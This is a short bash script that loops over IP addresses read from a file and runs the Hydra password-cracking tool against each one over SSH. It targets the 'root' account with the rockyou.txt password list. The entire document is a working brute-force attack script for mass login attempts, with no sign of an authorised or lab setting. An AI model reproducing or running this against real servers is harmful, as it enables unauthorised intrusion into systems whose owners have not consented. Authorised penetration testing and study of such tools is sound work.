#!/bin/bash

# Specify the path to your IP addresses file
ip_file="ipadres.txt"

# Specify the SSH username you want to test
ssh_username="root"

# Specify the path to your password list file
password_list="rockyou.txt"

# Loop through each IP address in the file
while IFS= read -r ip_address || [[ -n "$ip_address" ]]; do
    # Run Hydra for each IP address
    hydra -l "$ssh_username" -P "$password_list" "ssh://$ip_address"
done < "$ip_file"
